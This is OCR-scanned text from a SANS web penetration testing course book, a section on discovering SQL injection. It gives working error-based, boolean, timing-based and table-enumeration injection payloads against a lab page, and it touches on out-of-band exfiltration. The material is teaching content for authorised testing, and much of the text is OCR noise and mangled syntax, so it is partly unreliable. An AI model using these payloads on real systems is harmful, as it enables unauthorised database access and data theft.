• Example without comments: Dent' OR 'a'=' a 
SELECT ... WHERE lname='Dent' OR 'a'='a'; 
,._,, 
,._,, 
'-"
'-" 
'-' 
'-'
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
'-' 
'-' 
'-' 
The most common place our input lands in SQLi is within a quoted string, which is why adding a single stray 
quote causes the syntax error. That discovery completed, a proper prefix and suffix must be determined that can 
allow meaningful and impactful inputs that don't cause errors. 
The following inputs and the resulting queries can help us understand appropriate quoting with respect to 
prefixes and suffixes. 
Example with comments: Dent' ;-- 
SELECT ... WHERE lname= 'Dent';-- '; 
Example without comments: Dent' 
OR 'a'=' a 
SELECT ... WHERE lname= 'Dent' OR 'a'=' a' ; 
68 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..,, 
'-' 
'-' 
'-' 
'-' 
'-' 
'-..,, 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-' 
'-" 
'-' 
'-' 
'-' 
'-' 
'-' 
'-..,, 
Balancing Column Numbers 
SQL INSERT and UNION statements require us to know the number 
of columns required or used 
• DB Syntax Errors will occur otherwise 
INSERT INTO planets tbl (name,planet,heads) VALUES 
('Zaphod' ,'Betelgeuse' ,2); 
SELECT id, username, password FROM userl tbl WHERE 
username='Zaphod' UNION SELECT id2,username2, 
password2 FROM user2 tbl; 
Although quoting might be the most obvious balancing that must be done, other aspects also need the same 
degree of care. A number of SQL queries reference columns in multiple places, the number of which must 
match. 
We find this behavior with both INSERT and UNION statements. Our injections will need to be mindful of 
balancing the number of columns in these cases. 
SELECT id, username, password FROM userl tbl WHERE username='Zaphod' UNION 
SELECT id2,username2, password2 FROM user2 tbl; 
In the previous query, you can see three columns in the first SELECT (id, usemame, and password) and three in 
the SELECT being UNIONed (id2, username2, and password). Had the number of columns in the SELECTs not 
been the same, then the DB would throw a syntax error. 
A little later in the course, we explore how to determine the number of columns present. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
69 
'-..../ 
\.._.., 
[)ataType Balancing 
• INSER~ and UNION statements also require the data type 
associa~ed with the columns to match 
o Actualiy, that is what is typically said, but it isn't entirely accurate 
• The dath types don't have to match, but they need to be 
compatible/ convertible 
o Numbers and strings are typically compatible for this purpose(# <-> 
'AAA') 
'-..../ 
'-..../ 
\.._.., 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
Balancing columns actually can involve more than simply the number of columns. Again, both INSERT and 
UNION statements are in scope here, but this time rather than the number of columns, we are talking about what 
is contained in those columns. Although it is generally stated that the data types must match, in truth, the data 
types simply need to be compatible, or convertible. 
Though perhaps not intuitive, strings and numbers are typically compatible for the purposes of this 
consideration. As with determining the number of columns needed in an injection, we will explore a way to 
ensure this constraint does not hinder us greatly. 
70 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.._.., 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'---' 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-----' 
'-..../ 
'-..../
'-' 
'-..../
'-..../ 
'-..../ 
'-../ 
'--./ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Session Tracking 
2. Session Token Gathering 
3. Bypass Flaws 
4. Exerdse: Authentication t1>voa1,s 
5. Vulnerable Web Apps: MutiUidae 
6. Command Injection 
7. Exercise: Command Injection 
3. file Inclusion and Directory Traversal 
9. Exercise: Local/Remote File im::lvsion 
0. SQL Injection Primer 
I I. Discovering SQLi 
12. Exercise: Error-Based 
Exploiting SQLi 
! 4. SQLi Tools 
I S. Exercise: sqlmap + ZAP 
16.Summary 
SEC542 I Web App PenetrationTesting and E.tbkal Hacking 
11 
Course Roadmap 
The next section describes how to discover SQL injection flaws. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
71 
\.,../ 
\.,../ 
DiscoveringSQI.. Injection 
• Now you should have enough basic familiarity with verbs, data 
types, and special characters 
• We will now explore different types or classes of SQL injection 
flaws 
• While exploring these classes, we will also investigate discovering 
the various manifestations of SQL injection vulnerabilities 
\.,../ 
.,___, 
.,___, 
.,___, 
'--' 
'-..,J 
.,___, 
'--' 
.,___, 
.,___, 
'-..,J 
.,___, 
.,___, 
'-../ 
'-.J 
.,___, 
.,___, 
Discovering SQ Li flaws seems straightforward enough if you expect only the most obvious, error-based, class 
of flaws. To be successful with SQLi, we need to explore various manifestations of this flaw. As we glean some 
of the key aspects of the classes of SQ Li, we explore some basics of discovering the flaws themselves. 
72 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
.,___, 
.,___, 
\.,../ 
.,___, 
.,___, 
.,___, 
.,___, 
.,___, 
..._, 
.,___, 
.,___, 
.,___, 
.,___, 
'-,/ 
.,___, 
.,___, 
.,___, 
'--' 
'-,/ 
.,___, 
.,___, 
..._, 
..._, 
Input Locations 
Where in applications do we target SQLi ... ? 
• Everywhere, of course 
Our own mindful interactions with the application can help guide us to 
portions of the application more likely to interface with a backend database 
• Login functionality often leverages/interacts with a backend DB 
These portions of HTTP requests are the more common input locations 
• GET URL query parameters 
• POST payload 
• HTTP Cookie - SQLi here are more likely to be blind 
• HTTP User-Agent - SQ Li here are more likely to be blind 
SEC542 I Web App Penetration Testing and Etbica1 Hacking 
n 
Regardless of the type or class ofSQLi flaw we are up against, we still need to appreciate what inputs might 
lead to SQLi. The easy answer is, of course, any input could lead to SQ Li depending on the particular 
implementation. Although true, that isn't terribly helpful or insightful. 
Certainly, our interactions with the applications thus far will have given us insight into some particular inputs of 
interest. Likewise, there are portions of every application that are obvious SQLi targets. Authentication 
functionality immediately comes to mind given the propensity for applications to employ a DB backend for 
authentication purposes. 
Additionally, there are portions of our HTTP requests more likely to yield SQ Li pay dirt: 
GET URL query parameters 
POST payload 
HTTP Cookie - SQ Li here are more likely to be blind. 
HTTP User-Agent - SQ Li here are more likely to be blind. 
Note that some elements are more often expected to be blind SQLi flaws. We will explore what practical impact 
that has later. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
73 
Classes of SQLi 
• SQL injection flaws are reallyjust one vulnerability 
• In spite of this, we encounter these flaws in varied ways 
o Suggests there might be merit in distinguishing particular types or classes 
of SQ Li flaws 
• The different manifestations are consistent enough that they can 
inform techniques we will employ in discovery and exploitation 
• The simplest categorization is visible vs. blind, but a bit more 
detail is needed to be useful 
v
\_, 
\_, 
\_,
'-' 
\_,
\_,
\_,
\_,
\_, 
\_, 
\_,
'---'
'-'
A comment on the previous page suggested that some of the input locations were more commonly associated 
with blind SQLi flaws. Some of you might have been scratching your head on what exactly this means. Blind 
SQLi is considered to be a type or class ofSQLi flaw. 
Although, in truth, SQL injection is really just one type of vulnerability regardless of how it presents. Each of 
these types will have the same basic issue of client-supplied input being leveraged in the application such that 
the input gets interpreted by a DB backend to potentially ill effect. 
However, there are vastly different ways in which this one flaw can present to a client. Yet there is enough 
consistency among the variance that we can identify particular classes or types ofSQLi manifestations. We will 
explain and explore these classes with the goal that understanding them better will allow for increased likelihood 
of discovery, exploitation, and ultimately flaw remediation. 
74 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-'
'-'
'-'
'-'
'-'
___,
'--- 
'--'
'---
'---
'---- 
'-
'--- 
'--- 
'---
'-
'-
'-
'---
'---
'-
'---
'---
'--- 
'--- 
'---
ln-Band/lnline SQL.i 
• A SQL injection flaw that allows us to see the result of our 
injections is said to be 
in-band or inline SQLi 
• The visibility supplied by this class of SQ Li flaw renders the 
vulnerability 
o Simpler to discover 
o Easier to exploit 
The first class of SQ Li flaw to discuss is that of in-band or inline SQL injection. The term in-band or inline is 
used to suggest that the end user can see, largely unfettered, the results of the SQLi directly. The key 
differentiator of this flaw is the visibility associated with it. 
The visibility we are afforded makes this class of SQ Li flaw the simplest for us to both discover and exploit. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
75 
'--' 
'--' 
BUndSQLlnjection 
• If in-band/inline SQ Li can be characterized as providing visible 
results to the tester, then you can probably guess what is 
suggested by blind SQ Li 
o Nothing to see here ... 
• The vulnerability is the same, but our experience of the flaw 
differs markedly 
'--' 
'--' 
'-.../ 
'-.../ 
'-.../
--.....,, 
'-.../ 
'-.../ 
'-.../
'--' 
'--" 
'--' 
'--' 
'--' 
It is not terribly difficult to guess what is suggested by blind SQL injection, especially given that the hallmark of 
inline was that it provided visible results. The blindness in blind SQ Li has to do with what we, the adversary, are 
able to see associated with the injection and results. 
The most basic, but, we would submit oversimplified, way to classify SQ Li flaws is as either in-band/inline 
(visible) or blind- easy, binary, but wanting for more detail and nuance. 
76 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'--'
'--' 
'-.../ 
'--' 
\..../
'--' 
'--' . 
'--' 
'--" 
'-.../ 
'--' 
'-.../ 
'--' 
\..../ 
'--'
'--'
'--' 
'--'
'--'
._____,
'-./ 
'-./ 
'--,/
Varying Degrees of Blindness 
• Visible vs. blind seems straightforward enough until you start 
interacting with the flaws 
• Don't stress about the semantics, but what constitutes blind vs. 
inline proves problematic 
o Primarily because the flaws don't present as binary as suggested by these 
two categorizations 
• Rather, there is a spectrum of possibilities from full-tilt sensory- 
deprivation-tank-level blindness ... to white-box style visibility 
• Let's explore the spectrum a bit and see how it impacts our 
approach to testing 
The simple binary of inline vs. blind speaks to a useful way to discern, at a basic level, what type of SQ Li we 
are up against. However, it is overly simple to be of tremendous use. Also, the binary approach makes difficult 
the question of what constitutes a "blind" SQLi flaw. 
Although moderately helpful, binary is a bit too imprecise for our purposes here. SQLi flaws exist on a spectrum 
with respect to their degree of visibility. Put simply, the blindness is analog rather than digital. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
77 
'-' 
'-" 
Database Error Messages 
One aspect regarding blindness is typically pretty clear: 
• If you see database error messages, it isn't blind SQL injection 
Often the first attempts at discovering SQLi focus on attempting to 
illicit database error messages 
• Speaks to the ease of SQLi discovery with error messages 
• Also, speaks to the efficacy of this technique 
DB error messages not only hint at the existence of a SQLi flaw, but 
also can guide us in crafting our input appropriately for exploitation 
'-J 
'-J 
'-" 
'-" 
'-J 
'-" 
'-" 
'-J 
'-J 
'-' 
'-' 
'-J 
'-" 
Ifinline to blind is a spectrum rather than a binary, then the most visible end of the spectrum includes DB error 
messages. There might be some occasional bickering among professionals about what really constitutes blind 
enough to count as blind SQLi. However, there is no doubt whatsoever that if DB error messages are visible, 
then it definitely does not constitute blind SQLi. 
So, what is it about these error messages that make them so decidedly clear-cut and on the visible end of the 
spectrum? The DB error messages indicate a problem with the DB, which we presume is based on something 
that we submitted. In fact, the most common way to initially attempt discovery ofSQL flaws is to simply submit 
characters that are likely to cause a DB error message. 
78 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-J 
'-" 
'-" 
'-J 
'-...., 
'-" 
'-...., 
.__., 
'-...., 
.__., 
'-../ 
'-../ 
'-J 
'-J 
'-J 
'-J 
'-J 
.__., 
'-../ 
'-../ 
'-J 
'-J 
'-" 
'-' 
DB Error Message Example 
Please provide a Sirius Corp employee's last name (e.q, Dent). 
This will make 
things nice 
and easy ... 
Here is a quick example of what we are suggesting with the DB error messages. 
The input Dent' was supplied: 
The subsequent result: 
You have an error in your SQL syntax; check the manual 
that corresponds to yo~ 
server version for the 
right syntax to use ne~at line l 
"You have an error in your SQL syntax ... " Why yes, yes, I do. I will get right on with crafting my input until it 
passes muster all the while getting extremely useful DB error messages whenever I stray from proper syntax. 
This makes things much simpler. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
79 
\..../ 
Learn frornYour Mistakes 
DB error messages themselves will serve as our guide to not getting 
DB error messages 
ee Phone 
Second quote makes the error 
go away. This will inform how 
we craft our exploitation 
You have an error in your SQL syntax; check the manual 
that corresponds to yout-:.1.l\J"""'.., server version for the 
right syntax to use near "Dent'" at line 1 
Sirius Cybernetics Corporation 
Employee not found ... 
Contact the Complaints Department should you feel the 
need to Share and Enjoy. 
V 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-'
'-' 
'-'
'-' 
'-'
'-' 
\..../
\..../ 
'-'
'-'
Receiving a DB error message is outstanding, but ultimately, we will need to not cause an error message. In our 
first injection, we supplied the input of Dent'. Now, we simply add a second single quote to the end, 
submitting Dent' '. 
~=rioyee Phone L:~~;~!tQuery 1 
The results are interesting: 
Sirius Cybernetics Corporation 
Employee not found ••• 
Contact the Complaints Department should you feel the 
need to Share and Enjoy. 
We no longer receive an error message - no big data dump, but also no error. In some respects, this experience 
isn't the absolute visible end of the SQLi spectrum because we don't see the data that the DB thinks we input. It 
could have been even more helpful and suggested "Employee Dent' not found ... ", which would helpfully point 
out what happened. The second single quote effectively suggested to the DB that this is actually just supposed to 
be a literal single quote, as in the name O'Connor, for example. 
lfa single (')or(") causes a DB error, then a common next injection is to submit with an additional quote. 
80 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--../
'--../ 
'-'
'--../
'---'
'---'
'---' 
'-._., 
'-..,I 
'---' 
'---'
'---' 
'--../
'-._., 
'---'
'-'
'---' 
..__,,
'---'
'-._., 
'-._., 
'-._., 
'---'
Custom Error Messages 
Sometimes, we are not lucky enough to score DB error messages 
• No worries, all hope is not lost.. .. 
Custom application error messages can prove to be tremendously 
useful for our attacks 
• But we will have to approach them a bit differently 
Database error messages are extremely helpful and make discovery of SQL injection flaws much easier and 
more obvious. Typically, the first condition that could push the needle toward blind SQL injection is not 
displaying database error messages. 
Consider that the logic of the query need not have changed in any way whatsoever. In fact, it could well be that 
the DB is even throwing error messages, but that the application is handling them and instead presenting to the 
client something friendlier. Please understand the vulnerability has not changed at all, but the way in which we 
approach it will vary now, as we need to do more than simply look for those lovely DB error messages. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
81 
Custom Error Message Example 
,:He;,~.~-,;42orzib,qiiµl>p r. 
. 
I Note: bsqli • p~p 
liffl'x~• ft::,u~ .;'l>l'/APP Q!I0,"."'8' · · r 
"" 
rather than sqll. • php 
~ 
1l' 
,"{:( l!!l - 
Sirius Cybernetics Corporation 
em
. loyee Phone Lo,<1_.!-- llf'_·_·_·_······ .. , . 
Denn • 
I !)iubmltQuery I 
Please provide a Sirius Corp employee's last name (e.g. Dent). 
Code is functionally the 
same other than error 
message suppression 
Same input yields a 
custom rather than 
DB error message 
Sirius Cybernetics Corporation 
Employee not found ... 
Contact the Complaints Department should you feel the 
need to Share and Enjoy. 
SEC542 j Web App Penetrarion'lestlng and Ethical Hacking 
82 
'-" 
'-" 
'--' 
...__,, 
'-../ 
'-" 
'-" 
'-" 
'-" 
'--' 
'-' 
'-...,' 
''-' 
'-" 
'-' 
'-..,, ' 
Let's look at an example of custom error messages, which represent the first level of blindness we have 
experienced. 
We are hitting a different page this time, http://www. sec542. org/bsqli. php rather than 
http://www. sec542. org/sqli .php. Though the functionality and purpose of the application are the 
same as we saw before, this one could be characterized as blind SQ Li. 
As before, we submit Dent' into the entry point: 
However, now the result is different: 
82 
lii'tWAPP l!PJD\IWA 
,:~1~N,.,,~N_sec:542,.or:gii:;:;qlf.pt11'.,1 I 
y~@-~c'l $ ZctpY 
,3. 
ft ~ 
-~ -· 
IJE1~&~v 
1; Mutifil datf ~hWAPP 
Sirius Cybernetics Corporation 
em
. m loyee Phone Loo
, k
_ '_!_P
_ :_0. , 
•• , 
Denrl 
I f}iibmil Query 1 
Please provide a Sirius Corp employee's last name (e.g. Dent). 
,tr Ii!.! = 
Sirius Cybernetics Corporation 
Employee not found ... 
Contact the Complaints Department should you feel the 
need to Share and Enjoy. 
What we see as output is the same error message used for any name that is not found in the DB. It is not 
immediately obvious that this will be a SQLi flaw, and yet the actual query sent to the backend is the same. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-..., 
'-" 
'---' 
'-" 
'-..., 
'-' 
'-' 
\..J 
'---' 
'-" 
'-" 
'-..., 
'-../ 
\..J 
'-' 
\..J 
'-" 
'-" 
\..J 
'-" 
'-..., 
'--' 
Custom Errors and SQLi 
• sqli. php threw DB error messages, whereas bsqli. php did 
not, but both use the same query: 
mysql_query(
11SELECT * FROM Customers WHERE lname 
' II • $ GET [ II name II ] 
• II ' ; II ) 
• Same query ... same vulnerability ... and yet ... 
• With custom error messages, how can we tell whether our input is 
being interpreted by an SQL backend? 
o We need to find a way to discern this by crafting our input to expose 
whether it is being interpreted 
SEC542 IWebApp PenetratlonTestlngand Ethical Hacking 
83 
The primary difference between sqli. php and bsqli. php, shown previously, is that the former will throw 
DB error messages and the latter will not. 
Both pages use the same query: 
mysql_query("SELECT * FROM Customers WHERE lname = "'.$_GET["name"] ."';") 
The difference is simply that additional PHP code is included in sqli. php that will return error messages. 
sqli. php simply adds a die (mysql _ error () ) clause. 
The query is the same for both, as is the vulnerability. Yet, our experience ofit and the associated discovery can 
prove more challenging. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
83 
'-../ 
'---'
Without •oe·.Errors 
• Need to glean whether our input is being interpreted by the SQL 
backend (for example, SQLi flaw?) 
• We have supplied the following inputs: 
o Dent, which returned data 
o Dent' , which threw an "Employee not found" 
• What if we could supply input that when interpreted by SQL is 
functionally equivalent to Dent 
o But input that is not merely the characters: ~ e n ~ 
• If data returns as if we submitted Dent, then that would mean a 
SQL backend interpreted our input== SQLi flaw 
'---' 
\......, 
.'-../ 
'---' 
'-../ 
'---'
'-../
'-----' 
'-"
'-../
'-../ 
'-----' 
'-../ 
'-.../
Ifwe lack those DB error messages, how then can we find out whether there is a SQLi flaw? We need to find a 
means to determine whether our input is actually being used in a dynamically built query and interpreted by a 
SQL backend, which is kind of the definition of SQL injection. This sounds nice, but not terribly helpful. 
Consider that to the bsqli.php page, we have supplied these inputs: 
Dent, which returned data 
Dent', which threw an "Employee not found" 
What if we could submit something that, if interpreted by an SQL backend, would be functionally equivalent to 
having submitted Dent? If this string, which is not Dent, returns the same data as Dent, then that could provide 
some meaningful insight into this being SQ Li. 
84 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-----' 
'-----' 
'-../
'-----' 
'-----' 
'-../ 
'-" 
'-----' 
'--'
'-.../ 
'-----' 
'-"
'-" 
'-../
'--'
'-----' 
'-----' 
'-../ 
'-../ 
"--' 
"--'
'-----' 
'-../ 
'-../ 
'-../
Equivalent String Injections 
We are presumably injecting into a string ... 
• And need to supply input that, if interpreted, yields Dent 
Dent' 
;# 
Dent' 
. -- 
, 
De'/* */'nt 
De' 
'nt 
De' I 
I 'nt 
Commenting: Close string, statement, 
and comment rest of code out 
Commenting: Close string, statement, 
and comment rest of code out Space 
following (--) possibly required 
Inline Commenting: Close string, 
statement, and comment rest of code out 
Concatenation: Attempt with and 
without a space between 
Concatenation: Another concatenation 
SEC542 J Web App Penetration Testing and Ethical Hacking 
as 
Let's build some strings that could be equivalent to Dent. Two effective techniques for building equivalent 
strings are commenting and concatenation. 
Commenting involves injecting comments either in line or, most commonly, at the end of the injection. 
The concatenation technique has us build the string from smaller parts that we let the DB join together. 
I 
Prefix 
I 
Suffix 
' 
Note 
Dent' 
Dent' 
·-- 
, 
CornmentingrClose string, statement, and comment rest of code 
out 
Commenting: Close string, statement, and comment rest of code 
out. Space following(--) possibly required 
De'/* 
*/'nt 
Inline Commenting: 
of code out 
string, statement, and comment rest 
De' 
'nt 
Concatenation: Attempt with and without a space between 
De' I 
I 'nt 
Concatenation: Additional style of concatenation 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
85 
Inject for Comment 
• Comment delimiters ( - - , / * * /, #) can allow injections to 
succeed that would otherwise fail 
o This might feel a bit like cheating, or at least a dirty hack, but SQL 
comments can be really useful 
• The -- and # delimiters, if acceptable, are tremendously useful as 
a SQLi suffix 
• Injecting into the middle of a SQL statement/query causes 
problems because we cannot change the rest of the SQL statement 
that follows 
o Injecting comments can allow us to significantly change the SQL being 
submitted without causing a syntax error 
\._..I 
'-" 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-" 
'-..../ 
'-..../ 
Yielding an SQL error is awesome for penetration testers ... initially. At some point, we need to get past that 
error. Comments can be a serviceable tool to help get through a persistent SQL syntax error. The main way we 
use comments is as an injection suffix. A comment delimiter like - - or # at the end of an injection can nullify 
the impact of the source code after our point of injection. 
Granted, injecting a comment delimiter doesn't feel terribly clever or sophisticated. However, a working dirty 
hack is significantly better than an elegant one that fails ... 
Note: A trailing space after the comment delimiter(--) might be required for it to be handled properly. 
86 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-" 
'-..../ 
'-' 
'--' 
'-..../ 
\._,, 
'-..../ 
'---' 
'--" 
'--" 
'-" 
'--" 
.__,, 
'-" 
'-..../ 
'-" 
'-..../ 
\._..I 
'-..../
'-' 
'---' 
De1/**/1nt = De' 
'nt = Dent';# 
Dent';# 
Dent' . -- 
, 
De'/**/'nt 
De' 
'nt 
Sirius Cybernetics Corporation 
Employee Information 
Name: Arthur Dent 
Phone: (555) 867-5309 
Name: Random Dent 
Phone: (301) 951-0104 
Don't forget to try out the latest model of our 
Happy Vertical 'Iransporter. 
We have a SQLi flaw ... 
Let's look at the results of our attempts at injecting strings equivalent to Dent. 
We have three injections that leveraged comment characters and one that went the concatenation approach. 
Dent';# 
Dent';-- 
De'/**/'nt 
De' 
'nt 
Each of the previous inputs yield the same results as ifwe had submitted Dent by itself. We have SQLi. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
87 
'-" 
\-..., 
'-../ 
Binary/Boolean/Inference Testing 
Let's build on our previous tests and explore the power of 
Boolean/binary /True I False conditions 
•Dent' 
•Dent' 
• 
I 
• Dent' 
•Dent' 
AND 
AND 
1·# } 
1
1
1;# 
AND 0;# 
AND 1=0;# } 
Sirius Cybernetics Corporation 
Employee Information 
Arthur Dent 
hone: (555) 867-5309 
amee Random Dent 
hone: (301) 951-0104 
Sirius Cybernetics Corporation 
Employee not found ... 
\-..., 
'-../ 
'-../ 
'-" 
'-.../ 
'-.../ 
'-.../ 
'-./ 
'--./ 
'-./ 
'-./ 
'-./ 
'-./ 
'-._../ 
In the previous testing, we found that a SQL syntax error led to "No employee found," whereas our string 
(Dent) and interpreted equivalent strings (for example, De' 'nt) yielded data. 
Let's look at another key technique that will be incredibly important for our SQLi needs. The technique is an 
inference, and we will use this for increasingly blind injections. 
Here are some inputs that return employee data: 
Dent' AND 1;# 
Dent' AND 1=1;# 
And here are some that return only "Employee not found ... ": 
Dent' AND 0;# 
Dent' AND 1=0;# 
The power of AND 1=0 yielding something different than AND l=l might not be immediately obvious, but 
this is an important building block for us. 
88 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-._../ 
'-._../ 
'-._../ 
'-./ 
'-./ 
'-../ 
'-./ 
'-.../ 
'-./ 
'-._../ 
'-._../ 
'--./ 
'-._../ 
'-._../ 
'-._../ 
'-._../ 
'-./ 
'-._../ 
'-./ 
'-._../ 
'-._../ 
'-" 
'-._../ 
'-._../ 
'-._../ 
'-._../ 
Increasing Blindness 
The impact of AND 1=1 and AND 1=0 yielding different results is easily overlooked 
• Power comes from 1=1 being replaced by arbitrary SQL of our choosing to see if it evals to 
TRUE (AND 1=1) or FALSE (AND l=O) 
Technique is even more important as we become still more blind to output; consider this 
injection: 
Prefix: Dent ' AND 
Evaluation: substr((select table_name from information_schema.tables limit 1) ,1,1) > "a" 
Suffix: ;# 
Beginning with subs tr is the condition being evaluated 
• Checks to see whether the first letter of the first table name comes after A alphabetically 
It will return a 1 if true (Dent' AND 1 ; #) or a O if false (Dent' AND O ; #) 
Although custom error messages and other visible true/false paths can prove a bit more difficult to discover and 
exploit, there can be even more blindness to contend with. The inference approach armed with a way of 
differentiating TRUE from FALSE is tremendously powerful. 
Consider the following injection: 
Prefix: Dent' AND 
Evaluation: subs tr ( ( select table name from information schema. tables limit 
1) ,1,1) > "a" 
Suffix: ; # 
We haven't covered all these pieces of SQL, but we'll tackle it in pieces. We should be good on both the prefix 
and the suffix. The evaluation is where things look a bit different. The select statement is making things more 
cumbersome, but it is just a simple query. However, it is a powerful one used to determine the table names 
found in the database. Let's take a simpler example of the rest, which should help. 
subs tr() allows selecting part of an existing string. Which part of the string is determined by the numbers, which 
feel like offset and limit, respectively. 
substr("sec542",2,1) < "m" 
is TRUE 
So, the above (if selected) would return TRUE because the second letter of "sec542" is "e", which is earlier in 
the alphabet than "m". 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
89 
'---' 
Blind Timing Inferences 
• Let's amp up the blindness a bit more ... 
• Consider an application that provides no discernible output or errors to 
guide our SQLi 
o Timing-based inference testing could still be a viable option for us 
• Timing techniques use the responsiveness of the application for the inference 
by artificially inducing a delay when a condition evaluates 
• For example, these will introduce a 10-second delay: 
o Sleep (10) - MySQL 
o WAITFOR DELAY '0: 0: 10' - MS SQL 
• Other creative approaches exist to induce a delay 
Cool and all, but not really looking to do this by hand ... 
'-.,/ 
'-.,/ 
'-.,/ 
'---' 
'-.J 
'-" 
'-._,/ 
'-.,I 
'-._,/ 
'-._,/ 
'-.,I 
'-._,/ 
'--" 
The inference technique becomes truly powerful when we have SQLi that does not provide any output or errors to 
help us. Despite this, we still might have an opportunity for inference testing techniques. 
For this, we will build on our previous approach of AND 1 vs. AND 0 for our inference. We can still use the AND 
1 vs. AND 0 concept, but we will need to make the app tell us whether it evaluated to true or false. Without 
input, this is made more difficult. Imagine though ifwe can impact the DB server, then perhaps we could try to 
have the database trick the application into letting us experience whether the SQL evaluates to 1 or 0. 
This technique uses SQLi to inject a payload that will, if TRUE, introduce a perceptible impact on the 
responsiveness of the application. 
Two example methods of achieving this are: 
Sleep (10) -MySQL 
WAITFOR DELAY '0: 0: 10' -MS SQL 
90 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'-._; 
'-.,I 
'-" 
'-._; 
'---' 
'--' 
'-...,/ 
'-.,I 
'-._,/ 
'--' 
'-.,I 
'--' 
'-._; 
'--" 
'-._; 
'-._; 
'-._,/ 
'--" 
'--' 
'-._,/ 
'-.J 
"-./
'--../ 
'-' 
Utter Blindness: Out-of-Band SQl.i 
• At the opposite end of the spectrum from inline SQ Li stands out- 
of-band SQLi 
• These SQLi flaws present totally blind to the tester: 
o No error messages 
o No visible response 
o No Boolean/inference opportunities with( out) timing 
• The term out-of-band speaks to the requirement for an alternate 
communication channel to discover or exploit these flaws 
Now for the totally blind end of the SQ Li spectrum, out-of-band (OOB) SQ Li. We can't see anything, nor can 
we even experience something directly. 
But how about indirectly. What if, for example, we could have the database initiate a DNS request to a domain 
under our control, or ping a system, or make an HTTP client connection. These are the types of things associated 
with OOB SQ Li. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
91 
.__,, 
Out-of-Band Channels 
• If viable, out-of-band communication techniques might actually 
provide for faster exfiltration of some flaws susceptible to 
inference techniques 
o So, could be employed even if not, strictly speaking, required from an SQ Li 
perspective 
• The most common out-of-band techniques typically leverage 
HTTP or DNS to tunnel communications back to a server under 
the tester's control 
• Detailed out-of-band SQLi exploitation will be left as an exercise 
for the reader 
\...,)
.__,, 
.__,, 
'-../ 
'---'
'---'
'-./ 
'-.../ 
'-../ 
'---' 
'-' 
'-' 
'-' 
.__,, 
'-.../ 
'-' 
'-.../ 
Even if out-of-band SQ Li is not required, it might still be available. This manifestation of SQLi flaw proves 
harder to discover SQLi, and yet it still might be worthwhile to test for the OOB approach's existence, even if a 
simpler-to-discover SQLi flaw was encountered. This is especially true for timing-based blind SQLi flaws. The 
reason to pursue this flaw anyway stems from the fact that for high-volume data exfiltration, this method might 
prove more efficient than a more traditional approach to SQ Li exploitation. 
92 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../
'-../
'-..../ 
'-../ 
'-..../ 
'-' 
'-' 
'-../ 
'-../
'-../ 
'-' 
'-../ 
'-' 
'-.../ 
'-../ 
'-../ 
'-../
.__,, 
'--" 
'-../ 
'-.../ 
'-../ 
'-../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
Session Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass flaws 
4. Exercise: Authentication Bypass 
5. Vulnerable Web Apps: Mutiilidae 
6. Command Injection 
7. Exercise: Command Injection 
S. file Inclusion and Dh•ectorv Traversal 
9. Exercise: loca.J/Remote 
10. SQL Injection.Primer 
! ! .. Discovering SQli 
12. Exercise: Error-Based SQli 
I 
Exploiting SQLi 
i 4. SQLi Tools 
Inclusion 
l S. Exercise: sqlmap + ZAP 
16.Summary 
SEC542 J WebAppPenetrationTesting and Ethical Hacking 
u · 
Course Roadmap 
The next exercise will demonstrate error-based SQL injection. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
93 
.,___, 
'-' 
'---' 
SEC542 Workbook:Error-Based SQl..i 
Exercise 3.4: Error-Based SQLi 
'-' 
.,___, 
.,___, 
'-' 
'---' 
'-..," 
.,___, 
'---' 
.,___, 
'---' 
.,___, 
